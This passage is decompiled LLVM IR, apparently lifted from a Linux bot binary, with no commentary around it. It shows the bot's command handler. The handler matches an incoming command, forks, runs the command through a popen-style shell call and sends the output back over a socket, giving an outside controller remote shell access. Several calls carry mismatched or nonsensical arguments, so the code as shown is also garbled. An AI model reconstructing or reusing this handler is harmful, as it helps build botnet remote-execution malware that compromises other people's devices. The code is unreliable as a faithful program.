  store i32 %v6_804f623, i32* %eax.global-to-local, align 4
  %v3_804f625 = icmp ult i8 %v2_804f623, 32
  store i1 %v3_804f625, i1* %cf.global-to-local, align 1
  %v7_804f625 = icmp eq i8 %v2_804f623, 32
  br i1 %v7_804f625, label %dec_label_pc_804f632, label %dec_label_pc_804f629

dec_label_pc_804f629:                             ; preds = %dec_label_pc_804f615, %dec_label_pc_804f61d
  %v5_804f623215 = phi i32 [ %v5_804f623, %dec_label_pc_804f61d ], [ %v1_804f5d3, %dec_label_pc_804f615 ]
  %v4_804f620214 = phi i32 [ %v5_804f61d, %dec_label_pc_804f61d ], [ %v1_804f598, %dec_label_pc_804f615 ]
  %stack_var_-64.1213 = phi i8* [ %v22_804f61d, %dec_label_pc_804f61d ], [ %v5_804f59b, %dec_label_pc_804f615 ]
  store i32 %v4_804f620214, i32* %eax.global-to-local, align 4
  %v2_804f62c = load i8, i8* %stack_var_-64.1213, align 1
  %v3_804f62c = zext i8 %v2_804f62c to i32
  %v6_804f62c = or i32 %v3_804f62c, %v5_804f623215
  store i32 %v6_804f62c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f62e = icmp eq i8 %v2_804f62c, 0
  %v1_804f630 = icmp eq i1 %v4_804f62e, false
  br i1 %v1_804f630, label %dec_label_pc_804f61d, label %dec_label_pc_804f632

dec_label_pc_804f632:                             ; preds = %dec_label_pc_804f61d, %dec_label_pc_804f629, %dec_label_pc_804f615
  %stack_var_-64.1.lcssa = phi i8* [ %v5_804f59b, %dec_label_pc_804f615 ], [ %stack_var_-64.1213, %dec_label_pc_804f629 ], [ %v22_804f61d, %dec_label_pc_804f61d ]
  %v4_804f620.lcssa = phi i32 [ %v1_804f598, %dec_label_pc_804f615 ], [ %v4_804f620214, %dec_label_pc_804f629 ], [ %v5_804f61d, %dec_label_pc_804f61d ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_804f638 = add i32 %v4_804f620.lcssa, 1
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  %v2_804f666221 = load i8, i8* %v5_804f59b, align 1
  %v3_804f666222 = zext i8 %v2_804f666221 to i32
  %v6_804f666224 = or i32 %v3_804f666222, %v1_804f5d3
  store i32 %v6_804f666224, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f668225 = icmp eq i8 %v2_804f666221, 0
  %v1_804f66a226 = icmp eq i1 %v4_804f668225, false
  br i1 %v1_804f66a226, label %dec_label_pc_804f643, label %dec_label_pc_804f66c

dec_label_pc_804f643:                             ; preds = %dec_label_pc_804f632, %dec_label_pc_804f643
  %storemerge15228 = phi i8* [ %storemerge15, %dec_label_pc_804f643 ], [ %v5_804f59b, %dec_label_pc_804f632 ]
  %storemerge15.in227 = phi i32 [ %v5_804f660, %dec_label_pc_804f643 ], [ %v1_804f598, %dec_label_pc_804f632 ]
  store i32 %storemerge15.in227, i32* %eax.global-to-local, align 4
  %v2_804f646 = load i8, i8* %storemerge15228, align 1
  %v3_804f646 = zext i8 %v2_804f646 to i32
  store i32 %v3_804f646, i32* %eax.global-to-local, align 4
  %v0_804f64d = load i32, i32* @esp, align 4
  %v5_804f64d = icmp ult i32 %v0_804f64d, 12
  store i1 %v5_804f64d, i1* %cf.global-to-local, align 1
  %v2_804f650 = add i32 %v0_804f64d, -16
  %v3_804f650 = inttoptr i32 %v2_804f650 to i32*
  store i32 %v3_804f646, i32* %v3_804f650, align 4
  %v2_804f651 = call i32 @__GI_toupper(i32 %storemerge15.in227)
  %v0_804f656 = load i32, i32* @esp, align 4
  %v2_804f656 = icmp ugt i32 %v0_804f656, -17
  store i1 %v2_804f656, i1* %cf.global-to-local, align 1
  %v1_804f659 = urem i32 %v2_804f651, 256
  %v2_804f659 = load i32, i32* @edx, align 4
  %v3_804f659 = and i32 %v2_804f659, -256
  %v4_804f659 = or i32 %v3_804f659, %v1_804f659
  store i32 %v4_804f659, i32* @edx, align 4
  %v1_804f65e = trunc i32 %v2_804f651 to i8
  store i8 %v1_804f65e, i8* %storemerge15228, align 1
  %v5_804f660 = add i32 %storemerge15.in227, 1
  %storemerge15 = inttoptr i32 %v5_804f660 to i8*
  store i32 %v5_804f660, i32* %eax.global-to-local, align 4
  %v2_804f666 = load i8, i8* %storemerge15, align 1
  %v3_804f666 = zext i8 %v2_804f666 to i32
  %v5_804f666 = and i32 %v5_804f660, -256
  %v6_804f666 = or i32 %v3_804f666, %v5_804f666
  store i32 %v6_804f666, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f668 = icmp eq i8 %v2_804f666, 0
  %v1_804f66a = icmp eq i1 %v4_804f668, false
  br i1 %v1_804f66a, label %dec_label_pc_804f643, label %dec_label_pc_804f66c

dec_label_pc_804f66c:                             ; preds = %dec_label_pc_804f643, %dec_label_pc_804f632
  %v22_804f638 = inttoptr i32 %v5_804f638 to i8*
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804f598, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805f663.690 to i32), i32* @edi, align 4
  %v7_804f69c = call i32 @_strncmp(i8* %v5_804f59b, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805f663.690, i32 0, i32 0), i32 3)
  %v8_804f69c = urem i32 %v7_804f69c, 2
  %v9_804f69c = icmp eq i32 %v8_804f69c, 0
  %v0_804f69e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f69e = or i1 %v0_804f69e, %v9_804f69c
  %v3_804f69e = zext i1 %v2_804f69e to i32
  %v4_804f69e = load i32, i32* @edx, align 4
  %v5_804f69e = and i32 %v4_804f69e, -256
  %v6_804f69e = or i32 %v3_804f69e, %v5_804f69e
  %v7_804f69e = xor i32 %v6_804f69e, 1
  store i32 %v7_804f69e, i32* @edx, align 4
  %v3_804f6a4 = and i32 %v7_804f69c, -256
  %v1_804f6a6 = trunc i32 %v7_804f69e to i8
  %v3_804f6a6 = zext i1 %v0_804f69e to i8
  %v4_804f6a6 = sub nsw i8 %v1_804f6a6, %v3_804f6a6
  %v15_804f6a6 = icmp eq i8 %v4_804f6a6, 0
  %v20_804f6a6 = zext i8 %v4_804f6a6 to i32
  %v23_804f6a6 = or i32 %v20_804f6a6, %v3_804f6a4
  store i32 %v23_804f6a6, i32* @ecx, align 4
  %v2_804f6aa = sext i8 %v4_804f6a6 to i32
  store i32 %v2_804f6aa, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f6af = icmp eq i1 %v15_804f6a6, false
  br i1 %v1_804f6af, label %dec_label_pc_804f7a5, label %dec_label_pc_804f6b5

dec_label_pc_804f6b5:                             ; preds = %dec_label_pc_804f66c
  %v0_804f6b5 = call i32 @listFork()
  store i32 %v0_804f6b5, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f6ba = icmp eq i32 %v0_804f6b5, 0
  %v1_804f6bc = icmp eq i1 %v1_804f6ba, false
  br i1 %v1_804f6bc, label %dec_label_pc_804f8cf.outer26.backedge, label %dec_label_pc_804f6c2

dec_label_pc_804f6c2:                             ; preds = %dec_label_pc_804f6b5
  store i32 %v2_804f6c2, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804f6cf = load i32, i32* @esp, align 4
  %v5_804f6cf = icmp ult i32 %v0_804f6cf, 4
  store i1 %v5_804f6cf, i1* %cf.global-to-local, align 1
  %v2_804f6d2 = add i32 %v0_804f6cf, -8
  %v3_804f6d2 = inttoptr i32 %v2_804f6d2 to i32*
  store i32 1024, i32* %v3_804f6d2, align 4
  %v1_804f6d3 = add i32 %v0_804f6cf, -12
  %v2_804f6d3 = inttoptr i32 %v1_804f6d3 to i32*
  store i32 0, i32* %v2_804f6d3, align 4
  %v2_804f6d5 = add i32 %v0_804f6cf, -16
  %v3_804f6d5 = inttoptr i32 %v2_804f6d5 to i32*
  store i32 %v2_804f6c2, i32* %v3_804f6d5, align 4
  %v5_804f6d6 = call i32 @__GI_memset(i8* inttoptr (i32 3 to i8*), i32 ptrtoint ([3 x i8]* @global_var_805f663.690 to i32), i32 %v1_804f598)
  %v0_804f6db = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805f666.691 to i32), i32* %eax.global-to-local, align 4
  %tmp256 = and i32 %v0_804f6db, -4
  %v5_804f6e3 = icmp eq i32 %tmp256, -16
  store i1 %v5_804f6e3, i1* %cf.global-to-local, align 1
  %v6_804f6e6 = add i32 %v0_804f6db, 8
  %v7_804f6e6 = inttoptr i32 %v6_804f6e6 to i32*
  store i32 %v5_804f638, i32* %v7_804f6e6, align 4
  %v0_804f6e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f6e9 = add i32 %v0_804f6db, 4
  %v3_804f6e9 = inttoptr i32 %v2_804f6e9 to i32*
  store i32 %v0_804f6e9, i32* %v3_804f6e9, align 4
  store i32 %v2_804f6c2, i32* %eax.global-to-local, align 4
  %v3_804f6f0 = inttoptr i32 %v0_804f6db to i32*
  store i32 %v2_804f6c2, i32* %v3_804f6f0, align 4
  %v5_804f6f1 = call i32 @szprintf(i32 3, i32 ptrtoint ([3 x i8]* @global_var_805f663.690 to i32), i32 %v1_804f598, i32 %v1_804f598)
  %v0_804f6f6 = load i32, i32* @esp, align 4
  %tmp257 = and i32 %v0_804f6f6, -8
  %v5_804f6fe = icmp eq i32 %tmp257, -16
  store i1 %v5_804f6fe, i1* %cf.global-to-local, align 1
  %v2_804f701 = add i32 %v0_804f6f6, 4
  %v3_804f701 = inttoptr i32 %v2_804f701 to i32*
  store i32 ptrtoint (i32* @global_var_805f612.680 to i32), i32* %v3_804f701, align 4
  store i32 %v2_804f6c2, i32* @eax, align 4
  %v3_804f708 = inttoptr i32 %v0_804f6f6 to i32*
  store i32 %v2_804f6c2, i32* %v3_804f708, align 4
  %v0_804f709 = call i32 @fdpopen()
  store i32 %v0_804f709, i32* %eax.global-to-local, align 4
  %v3_804f75a = inttoptr i32 %v0_804f709 to i8*
  br label %dec_label_pc_804f76f

dec_label_pc_804f716:                             ; preds = %dec_label_pc_804f76f
  store i32 %v2_804f6c2, i32* %eax.global-to-local, align 4
  %v5_804f71c = icmp ult i32 %v1_804f786, 12
  store i1 %v5_804f71c, i1* %cf.global-to-local, align 1
  %v3_804f71f = inttoptr i32 %v0_804f786 to i32*
  store i32 %v2_804f6c2, i32* %v3_804f71f, align 4
  %v0_804f720 = call i32 @trim()
  %v0_804f725 = load i32, i32* @esp, align 4
  %v0_804f728 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804f728, i32* %edx.global-to-local, align 4
  %tmp258 = and i32 %v0_804f725, -4
  %v5_804f72e = icmp eq i32 %tmp258, -16
  store i1 %v5_804f72e, i1* %cf.global-to-local, align 1
  store i32 %v2_804f6c2, i32* %eax.global-to-local, align 4
  %v2_804f737 = add i32 %v0_804f725, 8
  %v3_804f737 = inttoptr i32 %v2_804f737 to i32*
  store i32 %v2_804f6c2, i32* %v3_804f737, align 4
  %v1_804f738 = add i32 %v0_804f725, 4
  %v2_804f738 = inttoptr i32 %v1_804f738 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805f66e.692 to i32), i32* %v2_804f738, align 4
  %v0_804f73d = load i32, i32* %edx.global-to-local, align 4
  %v3_804f73d = inttoptr i32 %v0_804f725 to i32*
  store i32 %v0_804f73d, i32* %v3_804f73d, align 4
  %v2_804f73e = call i32 @sockprintf(i32 %v0_804f709, i32 %stack_var_-28.1.ph)
  %v0_804f743 = load i32, i32* @esp, align 4
  store i32 %v2_804f6c2, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp259 = and i32 %v0_804f743, -4
  %v5_804f753 = icmp eq i32 %tmp259, -16
  store i1 %v5_804f753, i1* %cf.global-to-local, align 1
  %v2_804f756 = add i32 %v0_804f743, 8
  %v3_804f756 = inttoptr i32 %v2_804f756 to i32*
  store i32 1024, i32* %v3_804f756, align 4
  %v1_804f757 = add i32 %v0_804f743, 4
  %v2_804f757 = inttoptr i32 %v1_804f757 to i32*
  store i32 0, i32* %v2_804f757, align 4
  %v3_804f759 = inttoptr i32 %v0_804f743 to i32*
  store i32 %v2_804f6c2, i32* %v3_804f759, align 4
  %v2_804f75a = load i32, i32* %stack_var_-24, align 4
  %v4_804f75a = call i32 @__GI_memset(i8* %v3_804f75a, i32 %stack_var_-28.1.ph, i32 %v2_804f75a)
  store i32 %v4_804f75a, i32* %eax.global-to-local, align 4
  %v0_804f75f = load i32, i32* @esp, align 4
  %v1_804f75f = add i32 %v0_804f75f, 16
  %v5_804f762 = icmp ult i32 %v1_804f75f, 12
  store i1 %v5_804f762, i1* %cf.global-to-local, align 1
  %v2_804f765 = inttoptr i32 %v0_804f75f to i32*
  store i32 1, i32* %v2_804f765, align 4
  %v1_804f767 = call i32 @sleep(i32 %v0_804f709)
  store i32 %v1_804f767, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f76f

dec_label_pc_804f76f:                             ; preds = %dec_label_pc_804f6c2, %dec_label_pc_804f716
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp260 = and i32 %storemerge23.in.in, -4
  %v5_804f76f = icmp eq i32 %tmp260, -16
  store i1 %v5_804f76f, i1* %cf.global-to-local, align 1
  %v5_804f772 = add i32 %storemerge23.in.in, 8
  %v6_804f772 = inttoptr i32 %v5_804f772 to i32*
  store i32 %v0_804f709, i32* %v6_804f772, align 4
  %v1_804f775 = add i32 %storemerge23.in.in, 4
  %v2_804f775 = inttoptr i32 %v1_804f775 to i32*
  store i32 1024, i32* %v2_804f775, align 4
  store i32 %v2_804f6c2, i32* %eax.global-to-local, align 4
  %v3_804f780 = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_804f6c2, i32* %v3_804f780, align 4
  %v2_804f781 = load i32, i32* %stack_var_-24, align 4
  %v3_804f781 = call i32 @fdgets(i32 %v0_804f709, i32 %stack_var_-28.1.ph, i32 %v2_804f781)
  store i32 %v3_804f781, i32* %eax.global-to-local, align 4
  %v0_804f786 = load i32, i32* @esp, align 4
  %v1_804f786 = add i32 %v0_804f786, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f789 = icmp eq i32 %v3_804f781, 0
  %v1_804f78b = icmp eq i1 %v1_804f789, false
  br i1 %v1_804f78b, label %dec_label_pc_804f716, label %dec_label_pc_804f78d

dec_label_pc_804f78d:                             ; preds = %dec_label_pc_804f76f
  %v5_804f78d = icmp ult i32 %v1_804f786, 12
  store i1 %v5_804f78d, i1* %cf.global-to-local, align 1
  %v6_804f790 = inttoptr i32 %v0_804f786 to i32*
  store i32 %v0_804f709, i32* %v6_804f790, align 4
  %v0_804f793 = call i32 @fdpclose()
  store i32 %v0_804f793, i32* @eax, align 4
  %v0_804f798 = load i32, i32* @esp, align 4
  %v1_804f798 = add i32 %v0_804f798, 16
  %v5_804f79b = icmp ult i32 %v1_804f798, 12
  store i1 %v5_804f79b, i1* %cf.global-to-local, align 1
  %v2_804f79e = inttoptr i32 %v0_804f798 to i32*
  store i32 0, i32* %v2_804f79e, align 4
  %v1_804f7a0 = call i32 @__GI_exit(i32 %v0_804f709)
  store i32 %v1_804f7a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f7a5

dec_label_pc_804f7a5:                             ; preds = %dec_label_pc_804f66c, %dec_label_pc_804f78d
  store i32 %v5_804f638, i32* @eax, align 4
  %v0_804f7af = load i32, i32* @esp, align 4
  %v5_804f7af = icmp ult i32 %v0_804f7af, 8
  store i1 %v5_804f7af, i1* %cf.global-to-local, align 1
  %v1_804f7b2 = add i32 %v0_804f7af, -12
  %v2_804f7b2 = inttoptr i32 %v1_804f7b2 to i32*
  store i32 ptrtoint (i32* @global_var_805f671.693 to i32), i32* %v2_804f7b2, align 4
  %v0_804f7b7 = load i32, i32* @eax, align 4
  %v2_804f7b7 = add i32 %v0_804f7af, -16
  %v3_804f7b7 = inttoptr i32 %v2_804f7b7 to i32*
  store i32 %v0_804f7b7, i32* %v3_804f7b7, align 4
  %v1_804f7b8 = load i8*, i8** %stack_var_-36, align 4
  %v2_804f7b8 = ptrtoint i8* %v1_804f7b8 to i32
  %v3_804f7b8 = call i32 @__GI_strtok(i32 1, i32 %v2_804f7b8)
  %v0_804f7bd = load i32, i32* @esp, align 4
  %v1_804f7bd = add i32 %v0_804f7bd, 16
  %v5_804f7c0 = inttoptr i32 %v3_804f7b8 to i8*
  store i8* %v5_804f7c0, i8** %stack_var_-36, align 4
  store i32 %v1_804f598, i32* %eax.global-to-local, align 4
  store i32 %v1_804f598, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f87947 = icmp eq i32 %v3_804f7b8, 0
  %v1_804f87d54 = icmp eq i1 %v5_804f87947, false
  br i1 %v1_804f87d54, label %dec_label_pc_804f7d1, label %dec_label_pc_804f883

dec_label_pc_804f7d1:                             ; preds = %dec_label_pc_804f7a5, %dec_label_pc_804f864
  %v0_804f86474 = phi i32 [ %v1_804f873, %dec_label_pc_804f864 ], [ %v1_804f7bd, %dec_label_pc_804f7a5 ]
  %v3_804f7e1 = phi i8* [ %tmp171, %dec_label_pc_804f864 ], [ %v5_804f7c0, %dec_label_pc_804f7a5 ]
  %stack_var_-40.155 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804f864 ], [ 1, %dec_label_pc_804f7a5 ]
  %v4_804f7d1 = ptrtoint i8* %v3_804f7e1 to i32
  store i32 %v4_804f7d1, i32* %eax.global-to-local, align 4
  %v2_804f7d4 = load i8, i8* %v3_804f7e1, align 1
  %v3_804f7d4 = zext i8 %v2_804f7d4 to i32
  %v5_804f7d4 = and i32 %v4_804f7d1, -256
  %v6_804f7d4 = or i32 %v3_804f7d4, %v5_804f7d4
  store i32 %v6_804f7d4, i32* @eax, align 4
  %v6_804f7d6 = icmp ult i8 %v2_804f7d4, 10
  store i1 %v6_804f7d6, i1* %cf.global-to-local, align 1
  %v10_804f7d6 = icmp eq i8 %v2_804f7d4, 10
  br i1 %v10_804f7d6, label %dec_label_pc_804f864, label %dec_label_pc_804f7de

dec_label_pc_804f7de:                             ; preds = %dec_label_pc_804f7d1
  store i32 %stack_var_-40.155, i32* @ebx, align 4
  store i32 %v5_804f7d4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f7d1, i32* @edi, align 4
  %v3_804f7f8 = call i32 @_strlen(i8* %v3_804f7e1)
  %v1_804f7fc = add i32 %v3_804f7f8, 1
  store i32 %v1_804f7fc, i32* %eax.global-to-local, align 4
  %v0_804f800 = load i32, i32* @esp, align 4
  %v5_804f800 = icmp ult i32 %v0_804f800, 12
  store i1 %v5_804f800, i1* %cf.global-to-local, align 1
  %v2_804f803 = add i32 %v0_804f800, -16
  %v3_804f803 = inttoptr i32 %v2_804f803 to i32*
  store i32 %v1_804f7fc, i32* %v3_804f803, align 4
  %v2_804f804 = call i32 @malloc(i32 %v4_804f7d1)
  %v0_804f809 = load i32, i32* @esp, align 4
  %v2_804f809 = icmp ugt i32 %v0_804f809, -17
  store i1 %v2_804f809, i1* %cf.global-to-local, align 1
  %v1_804f80c = load i32, i32* @ebp, align 4
  %v2_804f80c = load i32, i32* @ebx, align 4
  %v3_804f80c = mul i32 %v2_804f80c, 4
  %v4_804f80c = add i32 %v1_804f80c, -616
  %v5_804f80c = add i32 %v4_804f80c, %v3_804f80c
  %v6_804f80c = inttoptr i32 %v5_804f80c to i32*
  store i32 %v2_804f804, i32* %v6_804f80c, align 4
  %v3_804f813 = load i8*, i8** %stack_var_-36, align 4
  %v4_804f813 = ptrtoint i8* %v3_804f813 to i32
  %v1_804f821 = and i32 %v4_804f813, -256
  store i32 %v1_804f821, i32* %eax.global-to-local, align 4
  %v3_804f82a = call i32 @_strlen(i8* %v3_804f813)
  %v1_804f82e = add i32 %v3_804f82a, 1
  store i32 %v1_804f82e, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_804f837 = load i32, i32* @ebp, align 4
  %v2_804f837 = mul i32 %stack_var_-40.155, 4
  %v3_804f837 = add i32 %v2_804f837, -616
  %v4_804f837 = add i32 %v0_804f837, %v3_804f837
  %v5_804f837 = inttoptr i32 %v4_804f837 to i32*
  %v6_804f837 = load i32, i32* %v5_804f837, align 4
  %v1_804f83e = inttoptr i32 %v6_804f837 to i8*
  store i32 %v6_804f837, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804f843 = and i32 %v6_804f837, -256
  store i32 %v1_804f843, i32* %eax.global-to-local, align 4
  %v5_804f845 = call i8* @_memset(i8* %v1_804f83e, i32 %v1_804f843, i32 %v1_804f82e)
  %v6_804f845 = ptrtoint i8* %v5_804f845 to i32
  store i32 %v6_804f845, i32* @ecx, align 4
  store i32 %v4_804f813, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_804f84d = load i32, i32* @ebp, align 4
  %v4_804f84d = add i32 %v0_804f84d, %v3_804f837
  %v5_804f84d = inttoptr i32 %v4_804f84d to i32*
  %v6_804f84d = load i32, i32* %v5_804f84d, align 4
  store i32 %v6_804f84d, i32* @eax, align 4
  %v0_804f854 = load i32, i32* @esp, align 4
  %v5_804f854 = icmp ult i32 %v0_804f854, 8
  store i1 %v5_804f854, i1* %cf.global-to-local, align 1
  %v2_804f857 = add i32 %v0_804f854, -12
  %v3_804f857 = inttoptr i32 %v2_804f857 to i32*
  store i32 %v4_804f813, i32* %v3_804f857, align 4
  %v0_804f858 = load i32, i32* @eax, align 4
  %v2_804f858 = add i32 %v0_804f854, -16
  %v3_804f858 = inttoptr i32 %v2_804f858 to i32*
  store i32 %v0_804f858, i32* %v3_804f858, align 4
  %v5_804f859 = call i32 @strcpy(i8* %v3_804f813, i32 %v4_804f7d1)
  store i32 %v5_804f859, i32* @eax, align 4
  %v0_804f85e = load i32, i32* @esp, align 4
  %v1_804f85e = add i32 %v0_804f85e, 16
  %v2_804f85e = icmp ugt i32 %v0_804f85e, -17
  store i1 %v2_804f85e, i1* %cf.global-to-local, align 1
  %v4_804f861 = add i32 %stack_var_-40.155, 1
  br label %dec_label_pc_804f864

dec_label_pc_804f864:                             ; preds = %dec_label_pc_804f7d1, %dec_label_pc_804f7de
  %v0_804f864 = phi i32 [ %v0_804f86474, %dec_label_pc_804f7d1 ], [ %v1_804f85e, %dec_label_pc_804f7de ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.155, %dec_label_pc_804f7d1 ], [ %v4_804f861, %dec_label_pc_804f7de ]
  %v5_804f864 = icmp ult i32 %v0_804f864, 8
  store i1 %v5_804f864, i1* %cf.global-to-local, align 1
  %v1_804f867 = add i32 %v0_804f864, -12
  %v2_804f867 = inttoptr i32 %v1_804f867 to i32*
  store i32 ptrtoint (i32* @global_var_805f671.693 to i32), i32* %v2_804f867, align 4
  %v1_804f86c = add i32 %v0_804f864, -16
  %v2_804f86c = inttoptr i32 %v1_804f86c to i32*
  store i32 0, i32* %v2_804f86c, align 4
  %v1_804f86e = load i8*, i8** %stack_var_-36, align 4
  %v2_804f86e = ptrtoint i8* %v1_804f86e to i32
  %v3_804f86e = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_804f86e)
  store i32 %v3_804f86e, i32* %eax.global-to-local, align 4
  %v0_804f873 = load i32, i32* @esp, align 4
  %v1_804f873 = add i32 %v0_804f873, 16
  store i32 %v3_804f86e, i32* %tmp169, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f879 = icmp eq i32 %v3_804f86e, 0
  %v1_804f87d = icmp eq i1 %v5_804f879, false
  %tmp171 = inttoptr i32 %v3_804f86e to i8*
  br i1 %v1_804f87d, label %dec_label_pc_804f7d1, label %dec_label_pc_804f883

dec_label_pc_804f883:                             ; preds = %dec_label_pc_804f864, %dec_label_pc_804f7a5
  %v0_804f883 = phi i32 [ %v1_804f7bd, %dec_label_pc_804f7a5 ], [ %v1_804f873, %dec_label_pc_804f864 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804f7a5 ], [ %stack_var_-40.0, %dec_label_pc_804f864 ]
  %v5_804f883 = icmp ult i32 %v0_804f883, 8
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 %v2_804f886, i32* %eax.global-to-local, align 4
  %v2_804f88c = add i32 %v0_804f883, -12
  %v3_804f88c = inttoptr i32 %v2_804f88c to i32*
  store i32 %v2_804f886, i32* %v3_804f88c, align 4
  %v5_804f88d = add i32 %v0_804f883, -16
  %v6_804f88d = inttoptr i32 %v5_804f88d to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_804f88d, align 4
  %v0_804f890 = call i32 @processCmd()
  store i32 %v0_804f890, i32* %eax.global-to-local, align 4
  %v0_804f895 = load i32, i32* @esp, align 4
  %v9_804f898 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804f898, i1* %cf.global-to-local, align 1
  %v7_804f89c = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804f89c, label %dec_label_pc_804f8ae.lr.ph, label %dec_label_pc_804f8cf.outer26.backedge

dec_label_pc_804f8ae.lr.ph:                       ; preds = %dec_label_pc_804f883
  %v1_804f895 = add i32 %v0_804f895, 16
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f8ae

dec_label_pc_804f8ae:                             ; preds = %dec_label_pc_804f8ae.lr.ph, %dec_label_pc_804f8ae
  %storemerge233 = phi i32 [ 1, %dec_label_pc_804f8ae.lr.ph ], [ %v4_804f8c4, %dec_label_pc_804f8ae ]
  %v0_804f8b8232 = phi i32 [ %v1_804f895, %dec_label_pc_804f8ae.lr.ph ], [ %v1_804f8c1, %dec_label_pc_804f8ae ]
  store i32 %storemerge233, i32* %eax.global-to-local, align 4
  %v0_804f8b1 = load i32, i32* @ebp, align 4
  %v2_804f8b1 = mul i32 %storemerge233, 4
  %v3_804f8b1 = add i32 %v2_804f8b1, -616
  %v4_804f8b1 = add i32 %v3_804f8b1, %v0_804f8b1
  %v5_804f8b1 = inttoptr i32 %v4_804f8b1 to i32*
  %v6_804f8b1 = load i32, i32* %v5_804f8b1, align 4
  store i32 %v6_804f8b1, i32* %eax.global-to-local, align 4
  %v5_804f8b8 = icmp ult i32 %v0_804f8b8232, 12
  store i1 %v5_804f8b8, i1* %cf.global-to-local, align 1
  %v2_804f8bb = add i32 %v0_804f8b8232, -16
  %v3_804f8bb = inttoptr i32 %v2_804f8bb to i32*
  store i32 %v6_804f8b1, i32* %v3_804f8bb, align 4
  %v1_804f8bc = call i32 @free(i32 %storemerge233)
  %v0_804f8c1 = load i32, i32* @esp, align 4
  %v1_804f8c1 = add i32 %v0_804f8c1, 16
  %v4_804f8c4 = add nuw nsw i32 %storemerge233, 1
  store i32 %v4_804f8c4, i32* %eax.global-to-local, align 4
  %v10_804f8ca = icmp ult i32 %v4_804f8c4, %stack_var_-40.1.lcssa
  store i1 %v10_804f8ca, i1* %cf.global-to-local, align 1
  %v5_804f8cd = icmp slt i32 %v4_804f8c4, %stack_var_-40.1.lcssa
  br i1 %v5_804f8cd, label %dec_label_pc_804f8ae, label %dec_label_pc_804f8cf.outer

dec_label_pc_804f8cf.outer:                       ; preds = %dec_label_pc_804f8ae, %dec_label_pc_804f22f
  %v0_804f8db.pre82 = phi i32 [ %v1_804f25a, %dec_label_pc_804f22f ], [ %v1_804f8c1, %dec_label_pc_804f8ae ]
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804f22f ], [ %v4_804f8c4, %dec_label_pc_804f8ae ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_804f22f ], [ %v22_804f638, %dec_label_pc_804f8ae ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph31, %dec_label_pc_804f22f ], [ %stack_var_-60.2, %dec_label_pc_804f8ae ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph32, %dec_label_pc_804f22f ], [ %stack_var_-96.1, %dec_label_pc_804f8ae ]
  br label %dec_label_pc_804f8cf.outer26

dec_label_pc_804f8cf.outer26:                     ; preds = %dec_label_pc_804f8cf.outer26.backedge, %dec_label_pc_804f8cf.outer
  %v0_804f8db.pre = phi i32 [ %v0_804f8db.pre82, %dec_label_pc_804f8cf.outer ], [ %v0_804f8db.pre.pre, %dec_label_pc_804f8cf.outer26.backedge ]
  %stack_var_-64.2.ph27 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_804f8cf.outer ], [ %stack_var_-64.2.ph27.be, %dec_label_pc_804f8cf.outer26.backedge ]
  %stack_var_-60.3.ph28 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_804f8cf.outer ], [ %stack_var_-60.2, %dec_label_pc_804f8cf.outer26.backedge ]
  %stack_var_-96.2.ph29 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804f8cf.outer ], [ %stack_var_-96.1, %dec_label_pc_804f8cf.outer26.backedge ]
  %v2_804f296 = ptrtoint i8* %stack_var_-64.2.ph27 to i32
  br label %dec_label_pc_804f8cf

dec_label_pc_804f8cf:                             ; preds = %dec_label_pc_804f8cf.outer26, %dec_label_pc_804f4c3
  %v0_804f8db = phi i32 [ %v1_804f4d6, %dec_label_pc_804f4c3 ], [ %v0_804f8db.pre, %dec_label_pc_804f8cf.outer26 ]
